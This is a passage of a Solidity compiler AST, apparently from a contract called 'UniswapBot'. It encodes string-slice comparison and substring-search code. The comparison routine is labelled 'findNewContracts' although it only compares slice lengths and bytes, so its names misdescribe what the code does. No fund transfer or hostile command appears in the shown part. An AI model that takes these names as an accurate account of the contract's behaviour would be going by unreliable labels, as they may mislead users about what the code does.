																				"typeDescriptions": {
																					"typeIdentifier": "t_int256",
																					"typeString": "int256"
																				}
																			},
																			"functionReturnParameters": 624,
																			"id": 738,
																			"nodeType": "Return",
																			"src": "2374:16:9"
																		}
																	}
																]
															}
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 744,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 742,
																	"name": "selfptr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 642,
																	"src": "2420:7:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 743,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2431:2:9",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "2420:13:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 745,
															"nodeType": "ExpressionStatement",
															"src": "2420:13:9"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 748,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 746,
																	"name": "otherptr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 647,
																	"src": "2448:8:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 747,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2460:2:9",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "2448:14:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 749,
															"nodeType": "ExpressionStatement",
															"src": "2448:14:9"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 657,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 655,
														"name": "idx",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 652,
														"src": "1440:3:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"id": 656,
														"name": "shortest",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 626,
														"src": "1446:8:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1440:14:9",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 751,
												"initializationExpression": {
													"assignments": [
														652
													],
													"declarations": [
														{
															"constant": false,
															"id": 652,
															"mutability": "mutable",
															"name": "idx",
															"nodeType": "VariableDeclaration",
															"overrides": null,
															"scope": 751,
															"src": "1426:8:9",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 651,
																"name": "uint",
																"nodeType": "ElementaryTypeName",
																"src": "1426:4:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"value": null,
															"visibility": "internal"
														}
													],
													"id": 654,
													"initialValue": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 653,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "1437:1:9",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "1426:12:9"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 660,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 658,
															"name": "idx",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 652,
															"src": "1456:3:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "+=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "3332",
															"id": 659,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1463:2:9",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_32_by_1",
																"typeString": "int_const 32"
															},
															"value": "32"
														},
														"src": "1456:9:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 661,
													"nodeType": "ExpressionStatement",
													"src": "1456:9:9"
												},
												"nodeType": "ForStatement",
												"src": "1421:1053:9"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													},
													"id": 762,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 754,
																	"name": "self",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 618,
																	"src": "2495:4:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																		"typeString": "struct UniswapBot.slice memory"
																	}
																},
																"id": 755,
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "_len",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 613,
																"src": "2495:9:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"id": 753,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "2491:3:9",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_int256_$",
																"typeString": "type(int256)"
															},
															"typeName": {
																"id": 752,
																"name": "int",
																"nodeType": "ElementaryTypeName",
																"src": "2491:3:9",
																"typeDescriptions": {
																	"typeIdentifier": null,
																	"typeString": null
																}
															}
														},
														"id": 756,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2491:14:9",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_int256",
															"typeString": "int256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 759,
																	"name": "other",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 620,
																	"src": "2512:5:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																		"typeString": "struct UniswapBot.slice memory"
																	}
																},
																"id": 760,
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "_len",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 613,
																"src": "2512:10:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"id": 758,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "2508:3:9",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_int256_$",
																"typeString": "type(int256)"
															},
															"typeName": {
																"id": 757,
																"name": "int",
																"nodeType": "ElementaryTypeName",
																"src": "2508:3:9",
																"typeDescriptions": {
																	"typeIdentifier": null,
																	"typeString": null
																}
															}
														},
														"id": 761,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2508:15:9",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_int256",
															"typeString": "int256"
														}
													},
													"src": "2491:32:9",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"functionReturnParameters": 624,
												"id": 763,
												"nodeType": "Return",
												"src": "2484:39:9"
											}
										]
									},
									"documentation": null,
									"id": 765,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "findNewContracts",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 621,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 618,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 765,
												"src": "1153:17:9",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
													"typeString": "struct UniswapBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 617,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 616,
													"src": "1153:5:9",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$616_storage_ptr",
														"typeString": "struct UniswapBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 620,
												"mutability": "mutable",
												"name": "other",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 765,
												"src": "1172:18:9",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
													"typeString": "struct UniswapBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 619,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 616,
													"src": "1172:5:9",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$616_storage_ptr",
														"typeString": "struct UniswapBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1152:39:9"
									},
									"returnParameters": {
										"id": 624,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 623,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 765,
												"src": "1215:3:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int256",
													"typeString": "int256"
												},
												"typeName": {
													"id": 622,
													"name": "int",
													"nodeType": "ElementaryTypeName",
													"src": "1215:3:9",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1214:5:9"
									},
									"scope": 2159,
									"src": "1127:1404:9",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 886,
										"nodeType": "Block",
										"src": "2868:1309:9",
										"statements": [
											{
												"assignments": [
													779
												],
												"declarations": [
													{
														"constant": false,
														"id": 779,
														"mutability": "mutable",
														"name": "ptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 886,
														"src": "2879:8:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 778,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "2879:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 781,
												"initialValue": {
													"argumentTypes": null,
													"id": 780,
													"name": "selfptr",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 769,
													"src": "2890:7:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2879:18:9"
											},
											{
												"assignments": [
													783
												],
												"declarations": [
													{
														"constant": false,
														"id": 783,
														"mutability": "mutable",
														"name": "idx",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 886,
														"src": "2908:8:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 782,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "2908:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 784,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "2908:8:9"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 787,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 785,
														"name": "needlelen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 771,
														"src": "2934:9:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<=",
													"rightExpression": {
														"argumentTypes": null,
														"id": 786,
														"name": "selflen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 767,
														"src": "2947:7:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2934:20:9",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 881,
												"nodeType": "IfStatement",
												"src": "2930:1205:9",
												"trueBody": {
													"id": 880,
													"nodeType": "Block",
													"src": "2956:1179:9",
													"statements": [
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 790,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 788,
																	"name": "needlelen",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 771,
																	"src": "2975:9:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<=",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 789,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2988:2:9",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "2975:15:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"id": 878,
																"nodeType": "Block",
																"src": "3645:479:9",
																"statements": [
																	{
																		"assignments": [
																			847
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 847,
																				"mutability": "mutable",
																				"name": "hash",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 878,
																				"src": "3714:12:9",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 846,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "3714:7:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 848,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "3714:12:9"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "3754:43:9",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "3756:39:9",
																					"value": {
																						"arguments": [
																							{
																								"name": "needleptr",
																								"nodeType": "YulIdentifier",
																								"src": "3774:9:9"
																							},
																							{
																								"name": "needlelen",
																								"nodeType": "YulIdentifier",
																								"src": "3785:9:9"
																							}
																						],
																						"functionName": {
																							"name": "keccak256",
																							"nodeType": "YulIdentifier",
																							"src": "3764:9:9"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "3764:31:9"
																					},
																					"variableNames": [
																						{
																							"name": "hash",
																							"nodeType": "YulIdentifier",
																							"src": "3756:4:9"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 847,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3756:4:9",
																				"valueSize": 1
																			},
																			{
																				"declaration": 771,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3785:9:9",
																				"valueSize": 1
																			},
																			{
																				"declaration": 773,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3774:9:9",
																				"valueSize": 1
																			}
																		],
																		"id": 849,
																		"nodeType": "InlineAssembly",
																		"src": "3745:52:9"
																	},
																	{
																		"body": {
																			"id": 876,
																			"nodeType": "Block",
																			"src": "3867:242:9",
																			"statements": [
																				{
																					"assignments": [
																						863
																					],
																					"declarations": [
																						{
																							"constant": false,
																							"id": 863,
																							"mutability": "mutable",
																							"name": "testHash",
																							"nodeType": "VariableDeclaration",
																							"overrides": null,
																							"scope": 876,
																							"src": "3890:16:9",
																							"stateVariable": false,
																							"storageLocation": "default",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							},
																							"typeName": {
																								"id": 862,
																								"name": "bytes32",
																								"nodeType": "ElementaryTypeName",
																								"src": "3890:7:9",
																								"typeDescriptions": {
																									"typeIdentifier": "t_bytes32",
																									"typeString": "bytes32"
																								}
																							},
																							"value": null,
																							"visibility": "internal"
																						}
																					],
																					"id": 864,
																					"initialValue": null,
																					"nodeType": "VariableDeclarationStatement",
																					"src": "3890:16:9"
																				},
																				{
																					"AST": {
																						"nodeType": "YulBlock",
																						"src": "3938:41:9",
																						"statements": [
																							{
																								"nodeType": "YulAssignment",
																								"src": "3940:37:9",
																								"value": {
																									"arguments": [
																										{
																											"name": "ptr",
																											"nodeType": "YulIdentifier",
																											"src": "3962:3:9"
																										},
																										{
																											"name": "needlelen",
																											"nodeType": "YulIdentifier",
																											"src": "3967:9:9"
																										}
																									],
																									"functionName": {
																										"name": "keccak256",
																										"nodeType": "YulIdentifier",
																										"src": "3952:9:9"
																									},
																									"nodeType": "YulFunctionCall",
																									"src": "3952:25:9"
																								},
																								"variableNames": [
																									{
																										"name": "testHash",
																										"nodeType": "YulIdentifier",
																										"src": "3940:8:9"
																									}
																								]
																							}
																						]
																					},
																					"evmVersion": "istanbul",
																					"externalReferences": [
																						{
																							"declaration": 771,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3967:9:9",
																							"valueSize": 1
																						},
																						{
																							"declaration": 779,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3962:3:9",
																							"valueSize": 1
																						},
																						{
																							"declaration": 863,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "3940:8:9",
																							"valueSize": 1
																						}
																					],
																					"id": 865,
																					"nodeType": "InlineAssembly",
																					"src": "3929:50:9"
																				},
																				{
																					"condition": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_bytes32",
																							"typeString": "bytes32"
																						},
																						"id": 868,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 866,
																							"name": "hash",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 847,
																							"src": "4005:4:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "==",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 867,
																							"name": "testHash",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 863,
																							"src": "4013:8:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							}
																						},
																						"src": "4005:16:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bool",
																							"typeString": "bool"
																						}
																					},
																					"falseBody": null,
																					"id": 871,
																					"nodeType": "IfStatement",
																					"src": "4001:57:9",
																					"trueBody": {
																						"expression": {
																							"argumentTypes": null,
																							"id": 869,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 779,
																							"src": "4055:3:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"functionReturnParameters": 777,
																						"id": 870,
																						"nodeType": "Return",
																						"src": "4048:10:9"
																					}
																				},
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 874,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftHandSide": {
																							"argumentTypes": null,
																							"id": 872,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 779,
																							"src": "4081:3:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "Assignment",
																						"operator": "+=",
																						"rightHandSide": {
																							"argumentTypes": null,
																							"hexValue": "31",
																							"id": 873,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "4088:1:9",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_1_by_1",
																								"typeString": "int_const 1"
																							},
																							"value": "1"
																						},
																						"src": "4081:8:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 875,
																					"nodeType": "ExpressionStatement",
																					"src": "4081:8:9"
																				}
																			]
																		},
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 858,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 854,
																				"name": "idx",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 783,
																				"src": "3832:3:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 857,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 855,
																					"name": "selflen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 767,
																					"src": "3839:7:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "-",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 856,
																					"name": "needlelen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 771,
																					"src": "3849:9:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "3839:19:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "3832:26:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"id": 877,
																		"initializationExpression": {
																			"expression": {
																				"argumentTypes": null,
																				"id": 852,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 850,
																					"name": "idx",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 783,
																					"src": "3823:3:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"hexValue": "30",
																					"id": 851,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "3829:1:9",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_0_by_1",
																						"typeString": "int_const 0"
																					},
																					"value": "0"
																				},
																				"src": "3823:7:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 853,
																			"nodeType": "ExpressionStatement",
																			"src": "3823:7:9"
																		},
																		"loopExpression": {
																			"expression": {
																				"argumentTypes": null,
																				"id": 860,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"nodeType": "UnaryOperation",
																				"operator": "++",
																				"prefix": false,
																				"src": "3860:5:9",
																				"subExpression": {
																					"argumentTypes": null,
																					"id": 859,
																					"name": "idx",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 783,
																					"src": "3860:3:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 861,
																			"nodeType": "ExpressionStatement",
																			"src": "3860:5:9"
																		},
																		"nodeType": "ForStatement",
																		"src": "3818:291:9"
																	}
																]
															},
															"id": 879,
															"nodeType": "IfStatement",
															"src": "2971:1153:9",
															"trueBody": {
																"id": 845,
																"nodeType": "Block",
																"src": "2992:647:9",
																"statements": [
																	{
																		"assignments": [
																			792
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 792,
																				"mutability": "mutable",
																				"name": "mask",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 845,
																				"src": "3011:12:9",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 791,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "3011:7:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 809,
																		"initialValue": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 807,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "UnaryOperation",
																					"operator": "~",
																					"prefix": true,
																					"src": "3034:34:9",
																					"subExpression": {
																						"argumentTypes": null,
																						"components": [
																							{
																								"argumentTypes": null,
																								"commonType": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								},
																								"id": 805,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": false,
																								"lValueRequested": false,
																								"leftExpression": {
																									"argumentTypes": null,
																									"commonType": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									},
																									"id": 803,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": false,
																									"lValueRequested": false,
																									"leftExpression": {
																										"argumentTypes": null,
																										"hexValue": "32",
																										"id": 795,
																										"isConstant": false,
																										"isLValue": false,
																										"isPure": true,
																										"kind": "number",
																										"lValueRequested": false,
																										"nodeType": "Literal",
																										"src": "3036:1:9",
																										"subdenomination": null,
																										"typeDescriptions": {
																											"typeIdentifier": "t_rational_2_by_1",
																											"typeString": "int_const 2"
																										},
																										"value": "2"
																									},
																									"nodeType": "BinaryOperation",
																									"operator": "**",
																									"rightExpression": {
																										"argumentTypes": null,
																										"components": [
																											{
																												"argumentTypes": null,
																												"commonType": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												},
																												"id": 801,
																												"isConstant": false,
																												"isLValue": false,
																												"isPure": false,
																												"lValueRequested": false,
																												"leftExpression": {
																													"argumentTypes": null,
																													"hexValue": "38",
																													"id": 796,
																													"isConstant": false,
